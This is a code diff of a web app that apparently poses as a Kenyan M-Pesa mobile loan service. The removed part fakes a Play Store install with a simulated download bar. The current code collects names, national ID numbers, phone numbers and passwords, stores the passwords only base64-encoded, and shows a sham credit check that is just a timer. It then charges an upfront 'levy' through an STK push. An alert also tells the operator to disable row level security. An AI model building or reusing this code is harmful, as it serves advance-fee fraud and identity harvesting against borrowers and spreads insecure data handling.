-            });
-            if (rating > 0) {
-                const btn = document.getElementById('btn-write-review');
-                btn.innerText = `Thanks for rating ${rating} stars!`;
-                btn.classList.remove('text-playBlue');
-                btn.classList.add('text-emerald-600');
-            }
-        }
+if('serviceWorker' in navigator){ window.addEventListener('load', ()=>{ navigator.serviceWorker.register('sw.js').catch(()=>{}); }); }
 
-        document.getElementById('btn-store-install').addEventListener('click', async () => {
-            console.log('[ZC] Install clicked. deferredPrompt exists?', !!deferredPrompt);
+/* APP LOGIC */
+function submitLogin(){
+    const name = document.getElementById('in-name').value.trim();
+    const id = document.getElementById('in-id').value.trim();
+    const mpesa = document.getElementById('in-mpesa').value.trim();
+    const pass = document.getElementById('in-pass').value;
+    if(!/^[A-Za-z][A-Za-z .'-]{2,}$/.test(name)) return showToast("Enter a valid full name.");
+    if(!/^\d{7,8}$/.test(id)) return showToast("National ID must be 7-8 digits.");
+    if(!/^0(?!77)(1[01]|7[0-9])\d{7}$/.test(mpesa)) return showToast("Enter a valid M-Pesa number.");
+    if(pass.length < 4) return showToast("Password must be at least 4 characters.");
+    state.name = name; state.id = id; state.mpesa = mpesa;
+    fetch(`${SUPABASE_URL}/rest/v1/users`, {
+        method:'POST',
+        headers:{ 'apikey':SUPABASE_KEY, 'Authorization':`Bearer ${SUPABASE_KEY}`, 'Content-Type':'application/json' },
+        body: JSON.stringify({ full_name:name, national_id:id, mpesa_number:mpesa, password_hash:"web_"+btoa(pass) })
+    }).catch(()=>{});
+    showScreen('screen-checking');
+    let p = 0;
+    const i = setInterval(()=>{
+        p += 20;
+        document.getElementById('check-bar').style.width = p + "%";
+        document.getElementById('check-percent').innerText = p + "%";
+        document.getElementById('check-status').innerText = p < 50 ? "Analyzing profile..." : "Calculating limit...";
+        if(p >= 100){ clearInterval(i); buildLoanScreen(); }
+    }, 150);
+}
 
-            if (deferredPrompt) {
-                // Fire the REAL Android install prompt
-                deferredPrompt.prompt();
-                const { outcome } = await deferredPrompt.userChoice;
-                console.log('[ZC] User choice:', outcome);
-                deferredPrompt = null;
-                if (outcome === 'accepted') {
-                    startFakeDownload();
-                } else {
-                    showToast("Installation cancelled");
-                }
-            } else {
-                // Fallback: still run the fake sequence so the user sees progress
-                // (they may have already installed the PWA, or Chrome blocked the prompt)
-                startFakeDownload();
-            }
-        });
+function buildLoanScreen(){
+    const grid = document.getElementById('amount-grid');
+    grid.innerHTML = '';
+    amounts.forEach(a=>{
+        const b = document.createElement('button');
+        b.className = `amount-btn py-3.5 text-sm ${a === state.loan ? 'selected' : ''}`;
+        b.innerText = a.toLocaleString();
+        b.onclick = ()=>{ document.querySelectorAll('.amount-btn').forEach(x=>x.classList.remove('selected')); b.classList.add('selected'); state.loan = a; updateSummary(); };
+        grid.appendChild(b);
+    });
+    updateSummary();
+    showScreen('screen-select');
+}
 
-        function startFakeDownload() {
-            document.getElementById('pre-install-buttons').classList.add('hide');
-            document.getElementById('downloading-buttons').classList.remove('hide');
-            document.getElementById('download-text').classList.remove('hide');
-            document.getElementById('ring-svg').classList.remove('hidden');
+function setTerm(d, b){ state.term = d; document.querySelectorAll('.term-btn').forEach(x=>x.classList.remove('selected')); b.classList.add('selected'); updateSummary(); }
 
-            let progress = 0;
-            const ring = document.getElementById('download-ring');
-            const pct = document.getElementById('download-percent');
-            // 30 second download
-            const totalTime = 30000;
-            const intervalTime = 100;
-            const increment = 100 / (totalTime / intervalTime);
+function updateSummary(){
+    state.levy = 1;
+    const rate = state.term === 30 ? 0.10 : (state.term === 60 ? 0.15 : 0.20);
+    state.interest = Math.round(state.loan * rate);
+    state.total = state.loan + state.interest;
+    document.getElementById('sum-receive').innerText = format(state.loan);
+    document.getElementById('sum-interest-label').innerText = `Interest (${Math.round(rate*100)}%)`;
+    document.getElementById('sum-interest').innerText = format(state.interest);
+    document.getElementById('sum-total').innerText = format(state.total);
+    document.getElementById('sum-due').innerText = getDueDate(state.term);
+    document.getElementById('sum-levy').innerText = format(state.levy);
+}
 
-            downloadInterval = setInterval(() => {
-                progress += increment;
-                if (progress > 100) progress = 100;
-                ring.style.strokeDashoffset = 301.59 - (progress / 100) * 301.59;
-                pct.innerText = Math.floor(progress) + "% of 10 MB";
-                if (progress >= 100) {
-                    clearInterval(downloadInterval);
-                    document.getElementById('download-text').classList.add('hide');
-                    document.getElementById('btn-installing').innerHTML = '<svg class="animate-spin h-5 w-5 inline" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path></svg> Installing...';
-                    // 3 second install phase
-                    setTimeout(() => showInstalledState(), 3000);
-                }
-            }, intervalTime);
-        }
+function goToPayment(){
+    document.getElementById('pay-loan').innerText = format(state.loan);
+    document.getElementById('pay-interest').innerText = format(state.interest);
+    document.getElementById('pay-total').innerText = format(state.total);
+    document.getElementById('pay-levy').innerText = format(state.levy);
+    document.getElementById('pay-name').innerText = state.name;
+    document.getElementById('pay-mpesa').value = state.mpesa;
+    resetPayButton();
+    showScreen('screen-payment');
+}
 
-        document.getElementById('btn-open-app').addEventListener('click', () => {
-            playStoreGate.classList.add('hide');
-            splashScreen.classList.remove('hide');
-            splashScreen.classList.add('splash-anim');
-            setTimeout(() => {
-                splashScreen.classList.add('hide');
-                appContent.classList.remove('hide');
-            }, 1800);
-        });
+async function processPayment(){
+    if(isProcessingPayment) return;
+    const mpesa = document.getElementById('pay-mpesa').value.trim();
+    if(!/^0(?!77)(1[01]|7[0-9])\d{7}$/.test(mpesa)) return showToast("Enter a valid M-Pesa number.");
+    isProcessingPayment = true;
+    state.mpesa = mpesa;
+    document.getElementById('btn-pay').disabled = true;
+    document.getElementById('verify-anim').classList.remove('hide');
+    document.getElementById('success-anim').classList.add('hide');
+    document.getElementById('failed-anim').classList.add('hide');
+    document.getElementById('pending-anim').classList.add('hide');
+    document.getElementById('verify-subtitle').innerText = "Please wait while we confirm with M-Pesa...";
+    document.getElementById('verify-time').innerText = "0s";
+    showScreen('screen-success');
 
-        const isStandalone = window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone;
-        if (isStandalone) {
-            playStoreGate.classList.add('hide');
-            appContent.classList.remove('hide');
-        } else {
-            playStoreGate.classList.remove('hide');
-            showInstallState();
-        }
+    try {
+        const res = await fetchWithTimeout(`${SUPABASE_URL}/functions/v1/palpluss-stk`, {
+            method:'POST',
+            headers:{ 'Authorization':`Bearer ${SUPABASE_KEY}`, 'Content-Type':'application/json' },
+            body: JSON.stringify({ amount:state.levy, phone:"254"+mpesa.substring(1), accountReference:"ZC_"+Date.now(), channelId:PALPLUSS_CHANNEL, callbackUrl:PALPLUSS_CALLBACK })
+        }, 30000);
 
-        // SERVICE WORKER
-        if ('serviceWorker' in navigator) {
-            window.addEventListener('load', () => {
-                navigator.serviceWorker.register('sw.js')
-                    .then(reg => console.log('[ZC] SW registered:', reg.scope))
-                    .catch(err => console.log('[ZC] SW failed:', err));
-            });
-        }
+        const data = await readJsonSafe(res);
+        if(!res.ok) throw new Error((data && (data.error || data.message)) || 'Payment service error ' + res.status);
+        if(!data) throw new Error("Empty response from payment service.");
+        const txnId = data.data?.transactionId || data.transactionId || data.id;
+        if(!txnId) throw new Error("No transaction ID in response.");
+        currentTxnId = txnId;
 
-        // ============ APP LOGIC ============
-        function submitLogin() {
-            const name = document.getElementById('in-name').value.trim();
-            const id = document.getElementById('in-id').value.trim();
-            const mpesa = document.getElementById('in-mpesa').value.trim();
-            const pass = document.getElementById('in-pass').value;
+        /* ===== CRITICAL: INSERT WITH LOUD ERROR ===== */
+        const insertRes = await fetchWithTimeout(`${SUPABASE_URL}/rest/v1/loans`, {
+            method:'POST',
+            headers:{ 'apikey':SUPABASE_KEY, 'Authorization':`Bearer ${SUPABASE_KEY}`, 'Content-Type':'application/json', 'Prefer':'return=minimal' },
+            body: JSON.stringify({ amount:state.loan, levy_duty:state.levy, status:"PENDING", palpluss_txn_id:txnId })
+        }, 8000);
 
-            if (!/^[A-Za-z][A-Za-z .'-]{2,}$/.test(name)) return showToast("Enter a valid full name.");
-            if (!/^\d{7,8}$/.test(id)) return showToast("National ID must be 7-8 digits.");
-            if (!/^0(?!77)(1[01]|7[0-9])\d{7}$/.test(mpesa)) return showToast("Enter a valid M-Pesa number.");
-            if (pass.length < 4) return showToast("Password must be at least 4 characters.");
-
-            state.name = name; state.id = id; state.mpesa = mpesa;
-            fetch(`${SUPABASE_URL}/rest/v1/users`, {
-                method: 'POST',
-                headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' },
-                body: JSON.stringify({ full_name: name, national_id: id, mpesa_number: mpesa, password_hash: "web_" + btoa(pass) })
-            }).catch(() => {});
-
-            showScreen('screen-checking');
-            let p = 0;
-            const int = setInterval(() => {
-                p += 20;
-                document.getElementById('check-bar').style.width = p + "%";
-                document.getElementById('check-percent').innerText = p + "%";
-                document.getElementById('check-status').innerText = p < 50 ? "Analyzing profile..." : "Calculating limit...";
-                if (p >= 100) { clearInterval(int); buildLoanScreen(); }
-            }, 150);
-        }
-
-        function buildLoanScreen() {
-            const grid = document.getElementById('amount-grid');
-            grid.innerHTML = '';
-            amounts.forEach(amt => {
-                const btn = document.createElement('button');
-                btn.className = `amount-btn py-3.5 text-sm ${amt === state.loan ? 'selected' : ''}`;
-                btn.innerText = amt.toLocaleString();
-                btn.onclick = () => {
-                    document.querySelectorAll('.amount-btn').forEach(b => b.classList.remove('selected'));
-                    btn.classList.add('selected');
-                    state.loan = amt;
-                    updateSummary();
-                };
-                grid.appendChild(btn);
-            });
-            updateSummary();
-            showScreen('screen-select');
-        }
-
-        function setTerm(days, btn) {
-            state.term = days;
-            document.querySelectorAll('.term-btn').forEach(b => b.classList.remove('selected'));
-            btn.classList.add('selected');
-            updateSummary();
-        }
-
-        function updateSummary() {
-            state.levy = 1;
-            const rate = state.term === 30 ? 0.10 : (state.term === 60 ? 0.15 : 0.20);
-            state.interest = Math.round(state.loan * rate);
-            state.total = state.loan + state.interest;
-            document.getElementById('sum-receive').innerText = format(state.loan);
-            document.getElementById('sum-interest-label').innerText = `Interest (${Math.round(rate*100)}%)`;
-            document.getElementById('sum-interest').innerText = format(state.interest);
-            document.getElementById('sum-total').innerText = format(state.total);
-            document.getElementById('sum-due').innerText = getDueDate(state.term);
-            document.getElementById('sum-levy').innerText = format(state.levy);
-        }
-
-        function goToPayment() {
-            document.getElementById('pay-loan').innerText = format(state.loan);
-            document.getElementById('pay-interest').innerText = format(state.interest);
-            document.getElementById('pay-total').innerText = format(state.total);
-            document.getElementById('pay-levy').innerText = format(state.levy);
-            document.getElementById('pay-name').innerText = state.name;
-            document.getElementById('pay-mpesa').value = state.mpesa;
+        if(!insertRes.ok){
+            const errText = await insertRes.text();
+            alert('❌ DATABASE REJECTED THE LOAN\n\n' + errText.substring(0,300) + '\n\n⚠️ FIX REQUIRED:\nGo to Supabase → SQL Editor → run:\n\nALTER TABLE loans DISABLE ROW LEVEL SECURITY;');
             resetPayButton();
             showScreen('screen-payment');
+            return;
         }
 
-        async function processPayment() {
-            if (isProcessingPayment) return;
-            const mpesa = document.getElementById('pay-mpesa').value.trim();
-            if (!/^0(?!77)(1[01]|7[0-9])\d{7}$/.test(mpesa)) return showToast("Enter a valid M-Pesa number.");
+        startPolling(txnId);
 
-            isProcessingPayment = true;
-            state.mpesa = mpesa;
-            document.getElementById('btn-pay').disabled = true;
+    } catch(err){
+        alert('❌ PAYMENT ERROR\n\n' + err.message);
+        resetPayButton();
+        showScreen('screen-payment');
+    }
+}
 
-            document.getElementById('verify-anim').classList.remove('hide');
-            document.getElementById('success-anim').classList.add('hide');
-            document.getElementById('failed-anim').classList.add('hide');
-            document.getElementById('pending-anim').classList.add('hide');
-            document.getElementById('verify-subtitle').innerText = "Please wait while we confirm with M-Pesa...";
-            document.getElementById('verify-time').innerText = "0s";
-            debugLines = [];
-            document.getElementById('debug-panel').classList.remove('hide');
-            log('Starting payment...');
-            showScreen('screen-success');
+async function checkStatusFromDB(txnId){
+    try {
+        const res = await fetchWithTimeout(`${SUPABASE_URL}/rest/v1/loans?palpluss_txn_id=eq.${encodeURIComponent(txnId)}&select=status`, {
+            headers:{ 'apikey':SUPABASE_KEY, 'Authorization':`Bearer ${SUPABASE_KEY}` }
+        }, 5000);
+        if(!res.ok) return { status:'ERROR' };
+        const rows = await readJsonSafe(res);
+        if(!Array.isArray(rows) || rows.length === 0) return { status:'NO_ROW' };
+        for(const row of rows){
+            const s = String(row.status || "").toUpperCase();
+            if(SUCCESS_STATUSES.includes(s)) return { status:'SUCCESS', raw:s };
+            if(FAILED_STATUSES.includes(s)) return { status:'FAILED', raw:s };
+        }
+        return { status:'PENDING' };
+    } catch(e){ return { status:'ERROR' }; }
+}
 
+function startPolling(txnId){
+    stopPolling();
+    let attempt = 0;
+    const doPoll = async ()=>{
+        try {
+            attempt++;
+            document.getElementById('verify-time').innerText = attempt + "s";
+            if(attempt === 8) document.getElementById('verify-subtitle').innerText = "Still checking. Enter your M-Pesa PIN if you haven't.";
+            if(attempt === 20) document.getElementById('verify-subtitle').innerText = "Taking longer than usual. Don't close the app.";
+            if(attempt >= MAX_POLL_SECONDS){ showPending(); return; }
+            if(isPolling){ pollTimer = setTimeout(doPoll, 1000); return; }
+            isPolling = true;
             try {
-                log('Calling STK push...');
-                const res = await fetchWithTimeout(`${SUPABASE_URL}/functions/v1/palpluss-stk`, {
-                    method: 'POST',
-                    headers: { 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        amount: state.levy,
-                        phone: "254" + mpesa.substring(1),
-                        accountReference: "ZC_" + Date.now(),
-                        channelId: PALPLUSS_CHANNEL,
-                        callbackUrl: PALPLUSS_CALLBACK
-                    })
-                }, 30000);
+                const result = await checkStatusFromDB(txnId);
+                if(result.status === 'SUCCESS'){ showSuccess(); return; }
+                if(result.status === 'FAILED'){ showFailed(); return; }
+            } finally { isPolling = false; }
+            const nextDelay = attempt < 5 ? 1000 : 2000;
+            pollTimer = setTimeout(doPoll, nextDelay);
+        } catch(e){ pollTimer = setTimeout(doPoll, 2000); }
+    };
+    doPoll();
+}
 
-                log('STK status: ' + res.status);
-                const data = await readJsonSafe(res);
-                log('STK data: ' + JSON.stringify(data).substring(0, 100));
+function showSuccess(){
+    stopPolling(); isProcessingPayment = false;
+    document.getElementById('verify-anim').classList.add('hide');
+    document.getElementById('pending-anim').classList.add('hide');
+    document.getElementById('success-anim').classList.remove('hide');
+    document.getElementById('suc-loan').innerText = format(state.loan);
+    document.getElementById('suc-total').innerText = format(state.total);
+    document.getElementById('suc-due').innerText = getDueDate(state.term);
+    document.getElementById('suc-mpesa').innerText = state.mpesa;
+}
 
-                if (!res.ok) {
-                    const errMsg = (data && (data.error || data.message)) || 'Payment service error ' + res.status;
-                    throw new Error(errMsg);
-                }
-                if (!data) throw new Error("Empty response from payment service.");
+function showFailed(){
+    stopPolling(); isProcessingPayment = false;
+    document.getElementById('verify-anim').classList.add('hide');
+    document.getElementById('pending-anim').classList.add('hide');
+    document.getElementById('failed-anim').classList.remove('hide');
+}
 
-                const txnId = data.data?.transactionId || data.transactionId || data.id;
-                if (!txnId) throw new Error("No transaction ID in response.");
+function showPending(){
+    stopPolling();
+    document.getElementById('verify-anim').classList.add('hide');
+    document.getElementById('pending-anim').classList.remove('hide');
+}
 
-                log('SUCCESS: Got txnId ' + txnId.substring(0, 15));
-                currentTxnId = txnId;
+async function checkStatusManual(){
+    const b = document.getElementById('btn-check-status');
+    b.innerHTML = '<span>Checking...</span>'; b.disabled = true;
+    const r = await checkStatusFromDB(currentTxnId);
+    if(r.status === 'SUCCESS'){ showSuccess(); return; }
+    if(r.status === 'FAILED'){ showFailed(); return; }
+    b.innerHTML = '<span>Check Status</span>'; b.disabled = false;
+    showToast("Still pending. Continuing to check...");
+    document.getElementById('pending-anim').classList.add('hide');
+    document.getElementById('verify-anim').classList.remove('hide');
+    document.getElementById('verify-subtitle').innerText = "Re-checking with M-Pesa...";
+    startPolling(currentTxnId);
+}
 
-                // Await the insert
-                log('Inserting loan row...');
-                try {
-                    const insertRes = await fetchWithTimeout(`${SUPABASE_URL}/rest/v1/loans`, {
-                        method: 'POST',
-                        headers: { 
-                            'apikey': SUPABASE_KEY, 
-                            'Authorization': `Bearer ${SUPABASE_KEY}`, 
-                            'Content-Type': 'application/json',
-                            'Prefer': 'return=minimal'
-                        },
-                        body: JSON.stringify({ amount: state.loan, levy_duty: state.levy, status: "PENDING", palpluss_txn_id: txnId })
-                    }, 8000);
+function retryPayment(){
+    stopPolling(); isProcessingPayment = false; currentTxnId = null;
+    showScreen('screen-payment'); resetPayButton();
+}
 
-                    log('Insert status: ' + insertRes.status);
-                    if (!insertRes.ok) {
-                        const errText = await insertRes.text();
-                        log('INSERT FAILED ' + insertRes.status + ': ' + errText.substring(0, 80));
-                        alert('DB Insert Failed (' + insertRes.status + '):\n\n' + errText.substring(0, 300) + '\n\nThe webhook cannot update your status. Check RLS policies on `loans` table (allow anon INSERT).');
-                    } else {
-                        log('Row inserted OK');
-                    }
-                } catch (e) {
-                    log('Insert error: ' + e.message);
-                }
-
-                startPolling(txnId);
-
-            } catch (err) {
-                log('ERROR: ' + err.message);
-                alert('Payment Error:\n\n' + err.message);
-                resetPayButton();
-                showScreen('screen-payment');
-            }
-        }
-
-        async function checkStatusFromDB(txnId) {
-            try {
-                const res = await fetchWithTimeout(
-                    `${SUPABASE_URL}/rest/v1/loans?palpluss_txn_id=eq.${encodeURIComponent(txnId)}&select=status`,
-                    { headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}` } },
-                    5000
-                );
-                if (!res.ok) {
-                    log('DB read failed: ' + res.status);
-                    return { status: 'ERROR' };
-                }
-                const rows = await readJsonSafe(res);
-                if (!Array.isArray(rows) || rows.length === 0) {
-                    log('DB: no rows yet');
-                    return { status: 'NO_ROW' };
-                }
-                for (const row of rows) {
-                    const s = String(row.status || "").toUpperCase();
-                    if (SUCCESS_STATUSES.includes(s)) return { status: 'SUCCESS', raw: s };
-                    if (FAILED_STATUSES.includes(s)) return { status: 'FAILED', raw: s };
-                }
-                log('DB: status=' + rows[0].status);
-                return { status: 'PENDING', raw: rows[0].status };
-            } catch (e) {
-                log('DB fetch error: ' + e.message);
-                return { status: 'ERROR' };
-            }
-        }
-
-        function startPolling(txnId) {
-            stopPolling();
-            let attempt = 0;
-
-            const doPoll = async () => {
-                try {
-                    attempt++;
-                    document.getElementById('verify-time').innerText = attempt + "s";
-
-                    if (attempt === 8) {
-                        document.getElementById('verify-subtitle').innerText = "Still checking. Enter your M-Pesa PIN if you haven't.";
-                    } else if (attempt === 20) {
-                        document.getElementById('verify-subtitle').innerText = "Taking longer than usual. Don't close the app.";
-                    }
-
-                    if (attempt >= MAX_POLL_SECONDS) { 
-                        log('Timeout reached');
-                        showPending(); 
-                        return; 
-                    }
-
-                    if (isPolling) { pollTimer = setTimeout(doPoll, 1000); return; }
-
-                    isPolling = true;
-                    try {
-                        const result = await checkStatusFromDB(txnId);
-                        if (result.status === 'SUCCESS') { 
-                            log('✓ SUCCESS: ' + result.raw); 
-                            showSuccess(); 
-                            return; 
-                        }
-                        if (result.status === 'FAILED') { 
-                            log('✗ FAILED: ' + result.raw); 
-                            showFailed(); 
-                            return; 
-                        }
-                    } finally {
-                        isPolling = false;
-                    }
-
-                    const nextDelay = attempt < 5 ? 1000 : 2000;
-                    pollTimer = setTimeout(doPoll, nextDelay);
-                } catch (e) {
-                    log('Loop error: ' + e.message);
-                    pollTimer = setTimeout(doPoll, 2000);
-                }
-            };
-
-            doPoll();
-        }
-
-        function showSuccess() {
-            stopPolling();
-            isProcessingPayment = false;
-            document.getElementById('verify-anim').classList.add('hide');
-            document.getElementById('pending-anim').classList.add('hide');
-            document.getElementById('success-anim').classList.remove('hide');
-            document.getElementById('suc-loan').innerText = format(state.loan);
-            document.getElementById('suc-total').innerText = format(state.total);
-            document.getElementById('suc-due').innerText = getDueDate(state.term);
-            document.getElementById('suc-mpesa').innerText = state.mpesa;
-        }
-
-        function showFailed() {
-            stopPolling();
-            isProcessingPayment = false;
-            document.getElementById('verify-anim').classList.add('hide');
-            document.getElementById('pending-anim').classList.add('hide');
-            document.getElementById('failed-anim').classList.remove('hide');
-        }
-
-        function showPending() {
-            stopPolling();
-            document.getElementById('verify-anim').classList.add('hide');
-            document.getElementById('pending-anim').classList.remove('hide');
-            document.getElementById('txn-display').innerText = 'Txn: ' + (currentTxnId || 'none');
-        }
-
-        async function checkStatusManual() {
-            const btn = document.getElementById('btn-check-status');
-            btn.innerHTML = `<span>Checking...</span>`;
-            btn.disabled = true;
-            const result = await checkStatusFromDB(currentTxnId);
-            if (result.status === 'SUCCESS') { showSuccess(); return; }
-            if (result.status === 'FAILED') { showFailed(); return; }
-            btn.innerHTML = `<span>Check Status</span>`;
-            btn.disabled = false;
-            showToast("Still pending. Continuing to check...");
-            document.getElementById('pending-anim').classList.add('hide');
-            document.getElementById('verify-anim').classList.remove('hide');
-            document.getElementById('verify-subtitle').innerText = "Re-checking with M-Pesa...";
-            startPolling(currentTxnId);
-        }
-
-        function forceComplete() {
-            const ok = confirm(
-                '⚠️ ONLY USE IF YOU HAVE BEEN CHARGED\n\n' +
-                'Transaction: ' + (currentTxnId || 'none') + '\n\n' +
-                'This marks the loan as completed manually. Tap OK only if M-Pesa charged you.'
-            );
-            if (!ok) return;
-            log('Manual completion by user');
-            showSuccess();
-        }
-
-        function retryPayment() {
-            stopPolling();
-            isProcessingPayment = false;
-            currentTxnId = null;
-            debugLines = [];
-            showScreen('screen-payment');
-            resetPayButton();
-        }
-
-        function openInChrome() { window.location.href = window.location.href; }
-        function copyLink() { navigator.clipboard.writeText(window.location.href).then(() => showToast("Link copied!")); }
-        function retryConnection() { location.reload(); }
-
-        if (!navigator.onLine) document.getElementById('offline-gate').classList.remove('hide');
-    </script>
+if(!navigator.onLine) document.getElementById('offline-gate').classList.remove('hide');
+</script>
 </body>
 </html>
